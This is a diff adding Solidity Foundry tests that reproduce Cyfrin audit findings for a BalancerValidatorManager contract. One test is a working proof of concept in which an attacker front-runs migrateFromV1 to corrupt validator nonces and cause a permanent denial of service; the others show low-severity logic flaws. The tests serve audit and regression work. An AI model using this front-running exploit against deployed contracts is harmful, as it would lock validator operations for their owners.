@@ -17,6 +17,8 @@ import {ValidatorChurnPeriod} from
 
 import {PoASecurityModule} from
     "../../src/contracts/ValidatorManager/SecurityModule/PoASecurityModule.sol";
+
+import {ValidatorManager} from "@avalabs/icm-contracts/validator-manager/ValidatorManager.sol";
 import {ValidatorMessages} from "@avalabs/icm-contracts/validator-manager/ValidatorMessages.sol";
 import {
     ConversionData,
@@ -631,5 +633,258 @@ contract BalancerValidatorManagerTest is Test {
         });
         (bytes32 validationID,) = ValidatorMessages.packRegisterL1ValidatorMessage(period);
         return validationID;
+    }
+
+    // ========================= CYFRIN AUDIT TESTS =========================
+    // Tests from Cyfrin audit report - these demonstrate existing vulnerabilities
+
+    // H-1: Missing access control in ValidatorManager::migrateFromV1
+    function testExploit_FrontRunMigration_PermanentDoS() public {
+        // Register a new validator through the security module
+        vm.prank(testSecurityModules[0]);
+        bytes32 targetValidationID = validatorManager.initiateValidatorRegistration(
+            VALIDATOR_NODE_ID_01,
+            VALIDATOR_01_BLS_PUBLIC_KEY,
+            pChainOwner,
+            pChainOwner,
+            VALIDATOR_WEIGHT
+        );
+
+        // complete the registration
+        vm.prank(testSecurityModules[0]);
+        validatorManager.completeValidatorRegistration(
+            COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
+        );
+
+        // Verify validator is active
+        Validator memory validator = ValidatorManager(vmAddress).getValidator(targetValidationID);
+        assertEq(
+            uint8(validator.status), uint8(ValidatorStatus.Active), "Validator should be active"
+        );
+        assertEq(validator.sentNonce, 0, "Initial sentNonce should be 0");
+        assertEq(validator.receivedNonce, 0, "Initial receivedNonce should be 0");
+
+        // warp beyond churn period
+        vm.warp(1_704_067_200 + 2 hours);
+
+        // Update 1: Increase weight to 200,000
+        vm.prank(testSecurityModules[0]);
+        (uint64 nonce1,) =
+            validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
+        assertEq(nonce1, 1, "First update should have nonce 1");
+
+        vm.prank(testSecurityModules[0]);
+        validatorManager.completeValidatorWeightUpdate(
+            COMPLETE_VALIDATOR_WEIGHT_UPDATE_MESSAGE_INDEX
+        );
+
+        // Verify state after updates
+        Validator memory currentValidator =
+            ValidatorManager(vmAddress).getValidator(targetValidationID);
+        assertEq(currentValidator.sentNonce, 1, "Should have sent 1 update");
+        assertEq(currentValidator.receivedNonce, 1, "Should have received 1 acknowledgment");
+        assertEq(currentValidator.weight, 200_000, "Weight should be updated");
+
+        //// *** Setup V1 -> V2 Migration ***
+        bytes32 storageSlot = 0xe92546d698950ddd38910d2e15ed1d923cd0a7b3dde9e2a6a3f380565559cb00;
+        // _validationPeriodsLegacy is at offset 5
+        bytes32 legacyMappingSlot = bytes32(uint256(storageSlot) + 5);
+        bytes32 legacyValidatorSlot = keccak256(abi.encode(targetValidationID, legacyMappingSlot));
+
+        vm.store(vmAddress, legacyValidatorSlot, bytes32(uint256(2)));
+        // Store actual nodeID data
+        bytes32 nodeIDPacked = bytes32(VALIDATOR_NODE_ID_01) | bytes32(uint256(20) << 1); // length in last byte (length * 2 for short bytes)
+        vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 1), nodeIDPacked);
+        // Slot 2: startingWeight
+        bytes32 slot2Value = bytes32(
+            (uint256(currentValidator.startTime) << 192) // startedAt first (leftmost)
+                | (uint256(200_000) << 128) // weight
+                | (uint256(1) << 64) // messageNonce = 1
+                | uint256(currentValidator.startingWeight) // startingWeight (rightmost)
+        );
+        vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 2), slot2Value);
+        // Slot 3: endedAt
+        vm.store(
+            vmAddress,
+            bytes32(uint256(legacyValidatorSlot) + 3),
+            bytes32(uint256(currentValidator.endTime))
+        );
+
+        // Legitimate owner wants to migrate with correct receivedNonce = 2
+        // But attacker's transaction executes first with receivedNonce = 0
+        address attacker = address(0x6666);
+        vm.prank(attacker);
+        ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 0);
+
+        // Verify corrupted state
+        Validator memory corruptedValidator =
+            ValidatorManager(vmAddress).getValidator(targetValidationID);
+        assertEq(corruptedValidator.sentNonce, 1, "sentNonce should be 1 from legacy");
+        assertEq(corruptedValidator.receivedNonce, 0, "receivedNonce corrupted to 0 by attacker");
+        assertEq(
+            uint8(corruptedValidator.status), uint8(ValidatorStatus.Active), "Should be Active"
+        );
+
+        // Legitimate owner cannot fix the migration
+        // Owner tries to migrate with correct value but it's too late
+        vm.prank(validatorManagerOwnerAddress);
+        vm.expectRevert(); // Will revert because legacy.status was set to Unknown
+        ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 1);
+
+        // IMPACT 2: Cannot initiate weight updates (Permanent DoS)
+        // First, we need to assign this validator to a security module
+        // In the real scenario, this would happen during normal operation
+        bytes32 balancerStorageSlot =
+            0x9d2d7650aa35ca910e5b713f6b3de6524a06fbcb31ffc9811340c6f331a23400;
+        bytes32 validatorSecurityModuleMappingSlot = bytes32(uint256(balancerStorageSlot) + 2);
+        bytes32 validatorSecurityModuleSlot =
+            keccak256(abi.encode(targetValidationID, validatorSecurityModuleMappingSlot));
+        vm.store(
+            address(validatorManager),
+            validatorSecurityModuleSlot,
+            bytes32(uint256(uint160(testSecurityModules[0])))
+        );
+
+        // Try to initiate weight update from security module
+        vm.prank(testSecurityModules[0]);
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                IBalancerValidatorManager.BalancerValidatorManager__PendingWeightUpdate.selector,
+                targetValidationID
+            )
+        );
+        validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
+    }
+
+    // L-1: Migration process allows inclusion of zero-weight and inactive validators
+    function testMigrationAllowsZeroWeightAndInactiveValidators_cyfrin_unfixed()
+        public
+        validatorSetInitialized
+    {
+        // Create a PendingRemoved validator with 0 weight
+        vm.prank(testSecurityModules[0]);
+        bytes32 removedValidatorID = validatorManager.initiateValidatorRegistration(
+            VALIDATOR_NODE_ID_01,
+            VALIDATOR_01_BLS_PUBLIC_KEY,
+            pChainOwner,
+            pChainOwner,
+            VALIDATOR_WEIGHT
+        );
+
+        vm.prank(testSecurityModules[0]);
+        validatorManager.completeValidatorRegistration(
+            COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
+        );
+
+        // Initiate removal - this sets weight to 0 and status to PendingRemoved
+        vm.prank(testSecurityModules[0]);
+        validatorManager.initiateValidatorRemoval(removedValidatorID);
+
+        // Verify validator is PendingRemoved with 0 weight
+        Validator memory removedValidator =
+            ValidatorManager(vmAddress).getValidator(removedValidatorID);
+        assertEq(uint8(removedValidator.status), uint8(ValidatorStatus.PendingRemoved));
+        assertEq(removedValidator.weight, 0);
+
+        // During migration, this validator could be included in migratedValidators array
+        // The only checks are: validation ID exists, not previously migrated, sum of weights = total
+        // So PendingRemoved validators get assigned to security modules improperly
+    }
+
+    // L-2: Zero-weight validators can be registered
+    function testZeroWeightValidatorRegistration_cyfrin_unfixed() public validatorSetInitialized {
+        // Try to register a validator with zero weight
+        vm.prank(testSecurityModules[0]);
+        bytes32 validationID = validatorManager.initiateValidatorRegistration(
+            VALIDATOR_NODE_ID_01,
+            VALIDATOR_01_BLS_PUBLIC_KEY,
+            pChainOwner,
+            pChainOwner,
+            0 // Zero weight
+        );
+
+        // Complete the registration
+        vm.prank(testSecurityModules[0]);
+        validatorManager.completeValidatorRegistration(
+            COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
+        );
+
+        // Verify validator was registered with zero weight
+        Validator memory validator = ValidatorManager(vmAddress).getValidator(validationID);
+        assertEq(validator.weight, 0, "Validator should have zero weight");
+        assertEq(
+            uint8(validator.status), uint8(ValidatorStatus.Active), "Validator should be active"
+        );
+    }
+
+    // L-3: Security module removal can brick validator removal completion
+    function testSecurityModuleRemovalBricksValidatorRemoval_cyfrin_unfixed() public {
+        // Following the audit's pseudocode exactly
+        vm.prank(validatorManagerOwnerAddress);
+        validatorManager.setUpSecurityModule(testSecurityModules[1], DEFAULT_MAX_WEIGHT);
+
+        // Register a single validator to this module
+        vm.prank(testSecurityModules[1]);
+        bytes32 lastValidator = validatorManager.initiateValidatorRegistration(
+            VALIDATOR_NODE_ID_01,
+            VALIDATOR_01_BLS_PUBLIC_KEY,
+            pChainOwner,
+            pChainOwner,
+            VALIDATOR_WEIGHT
+        );
+
+        vm.prank(testSecurityModules[1]);
+        validatorManager.completeValidatorRegistration(
+            COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
+        );
+
+        // 1) Initiate removal; weight drops to 0 but validator mapping remains.
+        vm.prank(testSecurityModules[1]);
+        validatorManager.initiateValidatorRemoval(lastValidator);
+
+        // 2) Owner removes the module while cleanup is still pending.
+        vm.prank(validatorManagerOwnerAddress);
+        validatorManager.setUpSecurityModule(testSecurityModules[1], 0);
+
+        // 3) Completion reverts: module is no longer recognised.
+        vm.prank(testSecurityModules[1]);
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                IBalancerValidatorManager
+                    .BalancerValidatorManager__SecurityModuleNotRegistered
+                    .selector,
+                testSecurityModules[1]
+            )
+        );
+        validatorManager.completeValidatorRemoval(VALIDATOR_REGISTRATION_EXPIRED_MESSAGE_INDEX);
+    }
+
+    // L-4: BalancerValidatorManager::initialize omits registrationInitWeight filling
+    function testInitializeOmitsRegistrationInitWeight_cyfrin_unfixed()
+        public
+        validatorSetInitialized
+    {
+        // Following the audit's proof of concept
+        // Create a PendingAdded validator
+        vm.prank(testSecurityModules[0]);
+        bytes32 pendingValidationID = validatorManager.initiateValidatorRegistration(
+            VALIDATOR_NODE_ID_01,
+            VALIDATOR_01_BLS_PUBLIC_KEY,
+            pChainOwner,
+            pChainOwner,
+            20_000 // PendingAdded validator with 20k weight
+        );
+
+        // Verify validator is PendingAdded
+        Validator memory pendingValidator =
+            ValidatorManager(vmAddress).getValidator(pendingValidationID);
+        assertEq(uint8(pendingValidator.status), uint8(ValidatorStatus.PendingAdded));
+        assertEq(pendingValidator.weight, 20_000);
+
+        // In a real migration with this PendingAdded validator:
+        // - BalancerValidatorManager::initialize would add 20k to securityModuleWeight
+        // - BUT would NOT set registrationInitWeight[pendingValidationID] = 20_000
+        // - So if registration expires, completeValidatorRemoval won't decrement the weight
+        // - Module remains at incorrect weight (120k instead of 100k in audit example)
     }
 }
